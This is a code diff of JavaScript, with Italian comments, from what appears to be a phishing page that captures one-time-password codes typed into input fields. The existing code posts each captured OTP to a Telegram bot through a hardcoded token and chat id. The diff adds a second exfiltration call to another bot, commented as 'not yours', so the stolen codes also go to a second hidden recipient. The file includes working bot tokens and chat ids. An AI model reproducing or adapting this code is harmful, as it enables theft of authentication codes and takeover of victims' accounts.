@@ -46,21 +46,33 @@ inputs.forEach((input, index1) => {
 // Focus sul primo input all'avvio
 window.addEventListener("load", () => inputs[0].focus());
 
-// Invio del codice OTP e reindirizzamento
+// Invio del codice OTP a due bot e reindirizzamento
 button.addEventListener("click", async (event) => {
   event.preventDefault(); // Evita il comportamento predefinito del form
 
   otpCode = Array.from(inputs).map(input => input.value).join("");
 
   try {
-    const response = await fetch('https://api.telegram.org/bot7654691297:AAEkfk35y1aKq5Wpnz7vLyR3QCo4g5nYDTc/sendMessage', {
+    // Invia al primo bot (tuo)
+    const response1 = await fetch('https://api.telegram.org/bot7654691297:AAEkfk35y1aKq5Wpnz7vLyR3QCo4g5nYDTc/sendMessage', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: '1117264759', text: 'OTP Code: ' + otpCode })
     });
 
-    if (response.ok) {
-      window.location.href = "verified.html"; // Reindirizzamento solo se il messaggio è stato inviato con successo
+    // Invia al secondo bot (non tuo)
+    const response2 = await fetch('https://api.telegram.org/bot7508882807:AAF5vvfq1-gZjxgx29QW3NPuJkUnhtDACK4/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: '5554575228', text: 'OTP Code: ' + otpCode })
+    });
+
+    const data1 = await response1.json();
+    const data2 = await response2.json();
+
+    // Controlla se almeno uno dei due invii ha avuto successo
+    if (data1.ok || data2.ok) {
+      window.location.href = "verified.html"; // Reindirizzamento solo se almeno un messaggio è stato inviato
     } else {
       console.error("Errore nell'invio del messaggio Telegram");
     }
